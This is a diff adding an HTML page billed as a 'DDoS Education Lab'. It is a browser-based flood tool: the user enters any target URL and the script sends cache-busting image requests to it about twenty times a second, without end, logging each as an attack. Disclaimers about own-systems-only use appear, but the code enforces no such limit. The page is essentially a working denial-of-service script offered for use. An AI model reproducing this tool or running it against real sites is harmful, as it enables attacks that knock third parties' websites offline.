@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>⚡ RootedArbab — DDoS Education Lab ⚡</title>
+  <style>
+    body { background: black; color: #00ff00; font-family: monospace; padding: 20px; }
+    h1 { color: #00ff00; text-align: center; }
+    #console { background: #111; border: 1px solid #0f0; padding: 15px; height: 300px; overflow-y: auto; margin-top: 15px; }
+    input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 300px; }
+    button { background: #0f0; color: black; font-weight: bold; border: none; padding: 5px 10px; margin-left: 5px; cursor: pointer; }
+    .section { border: 1px solid #0f0; padding: 15px; margin-top: 20px; border-radius: 8px; }
+    .warning { color: red; font-weight: bold; }
+    .green { color: #00ff00; }
+    .credit { margin-top: 20px; text-align: center; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <h1>⚡ RootedArbab — DDoS Education Lab ⚡</h1>
+  <p>Enter your target site (apni website only):</p>
+  <input type="text" id="target" placeholder="https://example.com">
+  <button onclick="startAttack()">🚀 Start</button>
+
+  <div id="console"></div>
+
+  <!-- Info Section -->
+  <div class="section">
+    <h2>📢 Welcome</h2>
+    <p class="warning">⚠️ For <span class="green">educational & personal testing</span> only.</p>
+    <p>⚡ Unauthorized use = <span class="warning">Illegal</span> ⚡</p>
+    <p>Use only on your own systems or with full permission.</p>
+  </div>
+
+  <div class="section">
+    <h2>📖 About</h2>
+    <p>This project is designed for learning network stress-testing and defensive security concepts.</p>
+    <p>It should <span class="warning">never</span> be made public or used against real-world systems.</p>
+  </div>
+
+  <div class="section">
+    <h2>📜 Disclaimer</h2>
+    <p class="warning">Developer is not responsible for any misuse of this tool.</p>
+    <p>By using this project you agree to keep it <span class="green">private</span> and <span class="green">ethical</span>.</p>
+  </div>
+
+  <div class="credit">
+    ⚡ Made with ❤️ by <b>RootedArbab</b>
+  </div>
+
+  <script>
+    let running = false;
+    let requests = 0;
+
+    function logMessage(msg) {
+      const consoleBox = document.getElementById("console");
+      consoleBox.innerHTML += msg + "\\n";
+      consoleBox.scrollTop = consoleBox.scrollHeight;
+    }
+
+    function startAttack() {
+      if (running) return;
+      const target = document.getElementById("target").value;
+      if (!target) {
+        alert("Enter a target URL first!");
+        return;
+      }
+      running = true;
+      logMessage("🚀 Starting attack on: " + target);
+      simulateFlood(target);
+    }
+
+    function simulateFlood(target) {
+      setInterval(() => {
+        requests++;
+        const img = new Image();
+        img.src = target + "?req=" + Math.random(); // Real HTTP request
+        logMessage("[ATTACK] Sent request #" + requests + " → " + target);
+      }, 50); // ~20 requests per second
+    }
+  </script>
+</body>
+</html>
